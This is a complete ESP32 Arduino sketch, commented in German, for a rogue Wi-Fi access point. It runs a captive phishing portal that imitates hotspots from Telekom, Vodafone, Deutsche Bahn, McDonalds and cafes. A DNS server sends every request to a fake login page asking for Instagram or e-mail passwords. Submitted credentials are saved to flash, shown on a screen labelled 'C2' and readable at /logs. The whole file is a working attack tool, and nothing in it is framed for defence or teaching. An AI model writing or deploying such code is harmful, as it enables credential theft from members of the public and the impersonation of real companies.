#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>
#include <LittleFS.h>

// Hardware-Pins
#define LCD_CS    15
#define LCD_DC      2
#define LCD_RST     4
#define LCD_BLK    32
#define BOOT_BTN    0  
#define N3_BTN     14  

Adafruit_ST7789 lcd = Adafruit_ST7789(LCD_CS, LCD_DC, LCD_RST);
WebServer server(80);
DNSServer dnsServer;
IPAddress apIP(172, 217, 28, 1); 

struct Profile {
  String vendor;
  String ssidOptions[2]; 
  String color;      
  String textColor;  
  String btnColor;   
};

// Profile mit spezifischem Branding
Profile profiles[] = {
  {"Telekom", {"Telekom_Hilfe", "Telekom_Service"}, "#e20074", "white", "#e20074"},
  {"Vodafone", {"Vodafone_Gast", "Vodafone_Station"}, "#e60000", "white", "#e60000"},
  {"Deutsche Bahn", {"DB Free Wifi", "WIFI@DB"}, "#ff0000", "white", "#ff0000"},
  {"McDonalds", {"McDonalds Free WIFI", "McDonalds_Guest"}, "#ffffff", "black", "#27ae60"},
  {"CityCafe", {"City_Wifi_Free", "CityCafe_Guest"}, "#ffffff", "black", "#333333"},
  {"Cafe Wifi", {"Cafe_Guest_Wifi", "Free_Cafe_Wifi"}, "#ffffff", "black", "#d35400"}
};

int currentProfile = 0;
int currentSsidIdx = 0;
String lastCaptured = "Warten..."; // Format: "User:Passwort"

// --- DATEI-SYSTEM ---

void saveToLog(String data) {
  File file = LittleFS.open("/log.txt", FILE_APPEND);
  if (file) {
    file.println(data);
    file.close();
  }
}

// --- MODERNES HTML TEMPLATE ---

String getPhishingHTML(String view) {
  Profile p = profiles[currentProfile];
  String s = "<!DOCTYPE html><html lang='de'><head><meta charset='UTF-8'>";
  s += "<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>";
  s += "<style>";
  s += "body{font-family:'Segoe UI',Arial,sans-serif;background:#f8f9fa;margin:0;color:#333;}";
  s += ".navbar{background:" + p.color + ";color:" + p.textColor + ";padding:20px;font-size:22px;font-weight:600;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,0.1); border-bottom: 1px solid #ddd;}";
  s += ".container{padding:25px;max-width:400px;margin:auto;}";
  s += ".card{background:white;padding:30px;border-radius:15px;box-shadow:0 8px 30px rgba(0,0,0,0.08);border:1px solid #eee;text-align:center;}";
  s += "h3{margin-top:0;font-size:20px;color:#222;} p{font-size:14px;color:#666;line-height:1.5;}";
  s += ".btn{display:flex;align-items:center;justify-content:center;height:55px;width:100%;margin:12px 0;border-radius:10px;font-size:16px;font-weight:600;text-decoration:none;transition:0.2s;}";
  s += ".btn-ig{background:linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);color:white;}";
  s += ".btn-mail{background:#333;color:white;}";
  s += ".btn-primary{background:" + p.btnColor + ";color:white;border:none;width:100%;cursor:pointer;}";
  s += "input{width:100%;height:50px;padding:0 15px;margin:10px 0;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;background:#fafafa;}";
  s += "input:focus{border-color:" + p.btnColor + ";outline:none;background:white;}";
  s += ".back{display:block;margin-top:20px;color:#999;text-decoration:none;font-size:13px;}";
  s += "</style></head><body>";
  s += "<div class='navbar'>" + p.vendor + "</div>";
  s += "<div class='container'><div class='card'>";

  if (view == "start") {
    s += "<h3>WiFi Authentifizierung</h3><p>Melden Sie sich an, um den kostenlosen Hotspot zu nutzen.</p>";
    s += "<a href='/ig' class='btn btn-ig'>Mit Instagram anmelden</a>";
    s += "<a href='/mail' class='btn btn-mail'>Mit E-Mail anmelden</a>";
  } else if (view == "ig") {
    s += "<h3>Instagram</h3><p>Anmeldung erforderlich</p>";
    s += "<form action='/capture' method='POST'><input type='hidden' name='m' value='IG'>";
    s += "<input type='text' name='u' placeholder='Benutzername' required>";
    s += "<input type='password' name='p' placeholder='Passwort' required>";
    s += "<button type='submit' class='btn btn-primary'>Einloggen</button></form>";
    s += "<a href='/' class='back'>&larr; Zurück</a>";
  } else if (view == "mail") {
    s += "<h3>E-Mail Login</h3><p>Verifizierung über Ihr E-Mail Konto</p>";
    s += "<form action='/capture' method='POST'><input type='hidden' name='m' value='Mail'>";
    s += "<input type='email' name='u' placeholder='E-Mail Adresse' required>";
    s += "<input type='password' name='p' placeholder='Passwort' required>";
    s += "<button type='submit' class='btn btn-primary'>Weiter</button></form>";
    s += "<a href='/' class='back'>&larr; Zurück</a>";
  }
  s += "</div></div></body></html>";
  return s;
}

// --- DISPLAY UPDATE ---

void updateDisplay() {
  lcd.fillScreen(ST77XX_BLACK);
  
  // Header
  lcd.fillRect(0, 0, 320, 30, 0x2104);
  lcd.setCursor(10, 7); lcd.setTextColor(ST77XX_WHITE); lcd.setTextSize(2);
  lcd.print("C2: "); lcd.print(profiles[currentProfile].vendor);

  // SSID Info
  lcd.setCursor(10, 40); lcd.setTextSize(1); lcd.setTextColor(ST77XX_YELLOW);
  lcd.print("SSID: "); lcd.setTextColor(ST77XX_WHITE);
  lcd.println(profiles[currentProfile].ssidOptions[currentSsidIdx]);

  // Capture Area Border
  lcd.drawRect(5, 60, 310, 95, ST77XX_GREEN);
  lcd.setCursor(15, 68); lcd.setTextColor(ST77XX_GREEN); lcd.setTextSize(1);
  lcd.println("LETZTER LOGIN:");

  // Daten trennen (Format "User:Passwort")
  int sep = lastCaptured.indexOf(':');
  String u = (sep != -1) ? lastCaptured.substring(0, sep) : lastCaptured;
  String p = (sep != -1) ? lastCaptured.substring(sep + 1) : "";

  // User Anzeige
  lcd.setCursor(15, 85); lcd.setTextColor(0xF800); // Rot
  lcd.setTextSize(u.length() > 15 ? 1 : 2);
  lcd.print("U: "); lcd.println(u);

  // Passwort Anzeige
  lcd.setCursor(15, 115); lcd.setTextColor(ST77XX_WHITE);
  lcd.setTextSize(p.length() > 15 ? 1 : 2);
  lcd.print("P: "); lcd.println(p);

  // Footer mit IP Hinweis
  lcd.setCursor(10, 160); lcd.setTextSize(1); lcd.setTextColor(0x7BEF);
  lcd.print("Logs: 172.217.28.1/logs");
}

// --- SERVER SETUP ---

void setupServer() {
  server.on("/", []() { server.send(200, "text/html", getPhishingHTML("start")); });
  server.on("/ig", []() { server.send(200, "text/html", getPhishingHTML("ig")); });
  server.on("/mail", []() { server.send(200, "text/html", getPhishingHTML("mail")); });

  // Stabiler Log-Abruf
  server.on("/logs", []() {
    if (!LittleFS.exists("/log.txt")) {
      server.send(200, "text/plain", "Noch keine Logs vorhanden.");
      return;
    }
    File file = LittleFS.open("/log.txt", FILE_READ);
    String output = "--- WIFI C2 LOGS ---\n\n";
    while(file.available()){
      output += file.readStringUntil('\n') + "\n";
    }
    file.close();
    server.send(200, "text/plain", output);
  });

  server.on("/clear", []() {
    LittleFS.remove("/log.txt");
    lastCaptured = "Geloescht";
    updateDisplay();
    server.send(200, "text/plain", "Logs wurden geloescht.");
  });

  server.on("/capture", HTTP_POST, []() {
    String method = server.arg("m");
    String user = server.arg("u");
    String pass = server.arg("p");
    
    saveToLog("[" + method + "] " + user + " | " + pass);
    
    lastCaptured = user + ":" + pass; 
    updateDisplay();
    
    server.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='2;url=https://google.com'></head><body style='text-align:center;padding-top:50px;font-family:sans-serif;'><h2>Erfolgreich verbunden!</h2><p>Geraet wird registriert...</p></body></html>");
  });

  server.onNotFound([]() { 
    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server.send(200, "text/html", getPhishingHTML("start")); 
  });
  server.begin();
}

void applyHardwareSettings() {
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(profiles[currentProfile].ssidOptions[currentSsidIdx].c_str());
  dnsServer.start(53, "*", apIP);
  updateDisplay();
}

void setup() {
  Serial.begin(115200);
  if(!LittleFS.begin(true)) Serial.println("FS Error");

  pinMode(LCD_BLK, OUTPUT);
  digitalWrite(LCD_BLK, HIGH);
  pinMode(BOOT_BTN, INPUT_PULLUP);
  pinMode(N3_BTN, INPUT_PULLUP);
  
  lcd.init(170, 320);
  lcd.setRotation(1);
  
  applyHardwareSettings();
  setupServer();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Profil wechseln
  if (digitalRead(BOOT_BTN) == LOW) {
    delay(200);
    int maxP = sizeof(profiles) / sizeof(profiles[0]);
    currentProfile = (currentProfile + 1) % maxP;
    currentSsidIdx = 0;
    applyHardwareSettings();
    while(digitalRead(BOOT_BTN) == LOW);
  }

  // SSID innerhalb des Profils wechseln
  if (digitalRead(N3_BTN) == LOW) {
    delay(200);
    currentSsidIdx = (currentSsidIdx + 1) % 2;
    applyHardwareSettings();
    while(digitalRead(N3_BTN) == LOW);
  }
}
